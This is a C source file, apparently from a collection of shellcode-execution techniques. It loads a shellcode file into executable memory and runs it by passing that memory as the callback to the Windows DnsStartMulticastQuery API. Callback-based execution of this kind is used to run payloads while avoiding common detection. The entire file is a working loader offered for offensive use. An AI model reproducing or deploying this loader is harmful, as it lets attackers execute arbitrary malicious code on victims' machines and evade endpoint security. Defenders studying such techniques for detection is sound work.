// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "dnsapi.lib")

#include <stdio.h>
#include <windows.h>
#include <windns.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: DnsStartMulticastQuery.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);
	
	MDNS_QUERY_REQUEST sMDNS = { 0 };
	sMDNS.Version = DNS_QUERY_REQUEST_VERSION1;
	sMDNS.ulRefCount = NULL;
	sMDNS.QueryType = DNS_TYPE_ZERO;
	sMDNS.QueryOptions = DNS_QUERY_STANDARD;
	sMDNS.InterfaceIndex = 0;
	sMDNS.Query = L"Wra7h"; //Doesn't seem to matter.
	sMDNS.pQueryCallback = hAlloc;
	sMDNS.pQueryContext = NULL;

	MDNS_QUERY_HANDLE sMDNSHandle = { 0 };

	DnsStartMulticastQuery(&sMDNS, &sMDNSHandle);
	DnsStopMulticastQuery(&sMDNSHandle);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}